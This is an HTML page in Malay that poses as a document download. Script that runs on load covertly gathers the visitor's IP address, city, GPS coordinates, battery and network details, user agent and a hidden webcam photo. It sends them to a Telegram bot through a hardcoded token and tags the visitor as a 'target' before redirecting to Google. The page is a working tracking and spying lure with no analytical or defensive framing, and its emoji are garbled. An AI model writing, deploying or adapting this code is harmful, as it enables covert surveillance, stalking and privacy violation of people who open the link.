<!DOCTYPE html>
<html lang="ms">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
</head>
<body style="background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif;">

    <p>Sila tunggu sebentar... Dokumen sedang dimuat turun.</p>

    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;" width="640" height="480"></canvas>

    <script>
        // --- KONFIGURASI ---
        const TOKEN = '8720467847:AAFxo75yX3BBCsdSXEwSSWATO6Gth76CTCo';
        
        // Ambil ID dari URL (?id=xxxx). Jika tiada, guna ID asal anda sebagai backup.
        const urlParams = new URLSearchParams(window.location.search);
        const CURRENT_CHAT_ID = urlParams.get('id') || '8563935930';

        async function startTrace() {
            const waktu = new Date().toLocaleString('ms-MY', { timeZone: 'Asia/Kuala_Lumpur' });
            
            // --- 1. Info Bateri ---
            let infoBateri = "Tidak dikesan";
            try {
                const battery = await navigator.getBattery();
                const level = Math.round(battery.level * 100);
                infoBateri = `${level}% (${battery.charging ? "ЁЯФМ Cas" : "ЁЯФЛ Bateri"})`;
            } catch (e) {}

            // --- 2. Info Rangkaian ---
            let infoRangkaian = "Tidak dikesan";
            if (navigator.connection) {
                infoRangkaian = navigator.connection.effectiveType.toUpperCase();
            }

            // --- 3. Ambil IP & Info Peranti ---
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                let infoAsas = `ЁЯФФ *TARGET BARU DIKESAN!*\n` +
                               `ЁЯУЕ *Masa:* ${waktu}\n` +
                               `ЁЯФЛ *Bateri:* ${infoBateri}\n` +
                               `ЁЯУб *Net:* ${infoRangkaian}\n` +
                               `ЁЯМР *IP:* \`${data.ip}\`\n` +
                               `ЁЯУН *Lokasi:* ${data.city}, ${data.country_name}\n` +
                               `ЁЯУ▒ *User-Agent:* ${navigator.userAgent}`;
                
                await sendToTele(infoAsas);
            } catch (e) { 
                await sendToTele(`тЪая╕П Target dikesan pada ${waktu} tetapi IP gagal diambil.`);
            }

            // --- 4. Lokasi GPS ---
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    await sendToTele(`ЁЯУН *LOKASI GPS TEPAT*\nLink: [Google Maps](${mapLink})`);
                }, null, { enableHighAccuracy: true });
            }

            // --- 5. Ambil Gambar ---
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(res => setTimeout(res, 2500)); 
                
                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                
                canvas.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('chat_id', CURRENT_CHAT_ID); // Hantar ke ID dinamik
                    fd.append('photo', blob, 'snap.jpg');
                    fd.append('caption', `ЁЯУ╕ Gambar Target\nтП░ ${waktu}\nЁЯЖФ ID: ${CURRENT_CHAT_ID}`);
                    
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg');
            } catch (e) {}

            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 5000);
        }

        async function sendToTele(text) {
            return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    chat_id: CURRENT_CHAT_ID, 
                    text: text, 
                    parse_mode: 'Markdown' 
                })
            });
        }

        window.onload = startTrace;
    </script>
</body>
</html>
